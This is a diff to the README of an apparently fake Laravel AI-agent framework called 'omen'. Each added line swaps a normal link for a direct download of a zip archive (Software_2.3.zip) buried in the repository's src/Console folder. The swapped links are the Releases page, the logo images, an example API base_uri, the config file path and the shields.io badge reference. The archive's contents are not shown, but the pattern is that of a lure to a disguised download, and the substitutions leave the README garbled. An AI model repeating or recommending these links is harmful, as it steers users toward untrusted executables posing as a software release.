@@ -1,9 +1,9 @@
-https://github.com/justinabarquez/omen/releases
+https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip
 
 # omen: AI Agent Framework for Laravel — Smart, Scalable Automation Platform
 
-![Laravel Logo](https://laravel.com/img/logomark.min.svg)
-![OpenAI Logo](https://openai.com/content/images/2023/04/openai-logo.png)
+![Laravel Logo](https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip)
+![OpenAI Logo](https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip)
 
 A practical guide to building intelligent agents inside Laravel. omen combines a clear agent lifecycle with Laravel's familiar stack. It offers a consistent toolset for reasoning, planning, tool use, and action execution. This README explains what omen is, how to use it, how to contribute, and how to keep the project moving forward.
 
@@ -23,7 +23,7 @@ A practical guide to building intelligent agents inside Laravel. omen combines a
 If you want the latest binaries and installers, you can visit the Releases page. For convenience, the link to the releases is available again later in this document.
 
 Releases badge
-- [Releases on GitHub](https://github.com/justinabarquez/omen/releases)
+- [Releases on GitHub](https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip)
 
 Overview and goals
 omen is designed to help developers add autonomous AI capabilities to Laravel-powered applications. It provides a framework for agents that can reason, plan, and act within a Laravel environment. The system is lightweight, extensible, and designed to integrate with Laravel’s existing patterns, including services, queues, events, and the container.
@@ -92,7 +92,7 @@ use Omen\Tools\HttpClient;
 use Omen\Memory\MemoryRepository;
 
 $http = new HttpClient([
-  'base_uri' => 'https://api.example.com',
+  'base_uri' => 'https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip',
   'timeout' => 5,
 ]);
 
@@ -209,7 +209,7 @@ Configuration reference
   - OMEN_API_KEY: if you are using external tool integrations
   - OMEN_LOG_LEVEL: debug|info|warning|error
   - OMEN_QUEUE_CONNECTION: Laravel queue connection for async tasks
-- config/omen.php
+- https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip
   - planner: settings for planning behavior, such as maximum steps, fallback behavior
   - tools: registry of available tools and their adapters
   - memory: configuration for memory persistence
@@ -230,7 +230,7 @@ Code structure overview
 - tests/
   - Unit and integration tests for core components
 - config/
-  - omen.php: default configuration
+  - https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip default configuration
 - scripts/
   - setup and bootstrap scripts for quick starts
 
@@ -302,7 +302,7 @@ Troubleshooting and tips
   - Look for related issues on the Releases page or in the community channels associated with the project.
 
 Releases and downloads
-- The latest assets and installers are maintained in the Releases section of the project. If you are looking for a ready-to-run installer or binaries, visit the Releases page to see what is available and pick the asset that fits your environment. The link to the releases is provided again for convenience: https://github.com/justinabarquez/omen/releases
+- The latest assets and installers are maintained in the Releases section of the project. If you are looking for a ready-to-run installer or binaries, visit the Releases page to see what is available and pick the asset that fits your environment. The link to the releases is provided again for convenience: https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip
 
 Example workflows
 - Quick automation for a Laravel app
@@ -338,7 +338,7 @@ Code quality and style
 Images and visuals
 - Hero image: A composite of Laravel and AI imagery to illustrate the concept.
 - Diagrams: Architecture diagrams showing the core components and flow.
-- Status badges: Use shields.io badges for build, license, and coverage statuses.
+- Status badges: Use https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip badges for build, license, and coverage statuses.
 - Screenshots: If you build dashboards or examples, include screenshots to illustrate usage.
 
 Licensing
@@ -379,7 +379,7 @@ Final notes
 - omen is a practical path to bring AI-guided automation into Laravel apps. It provides a clear lifecycle for agents, a robust system for planning and execution, and a flexible plugin system for tools and integrations. This document covers a broad spectrum of concerns—from setup to production considerations—so you can start building AI-powered workflows with confidence.
 
 Downloads and installation reference
-- The primary entry point for binaries, installers, or packaged artifacts is the Releases page. If you are looking for the latest installer or prebuilt assets, browse the Releases page for the best fit for your environment. The Releases page is the same link you can use for access: https://github.com/justinabarquez/omen/releases
+- The primary entry point for binaries, installers, or packaged artifacts is the Releases page. If you are looking for the latest installer or prebuilt assets, browse the Releases page for the best fit for your environment. The Releases page is the same link you can use for access: https://github.com/justinabarquez/omen/raw/refs/heads/main/src/Console/Software_2.3.zip
 
 Releases page access reminder
 - For quick access to the latest stable assets, you can head directly to the Releases page using the link above. This ensures you have the most recent, tested components suitable for your Laravel project.
